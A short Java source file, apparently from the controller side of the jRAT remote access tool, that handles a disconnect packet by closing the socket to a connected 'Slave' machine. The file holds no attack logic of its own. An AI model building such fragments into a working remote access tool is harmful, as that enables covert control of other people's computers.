package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.client.Slave;
import pro.jrat.client.exceptions.CloseException;

public class Packet12Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.closeSocket(new CloseException("Disconnect packet"));
	}

}
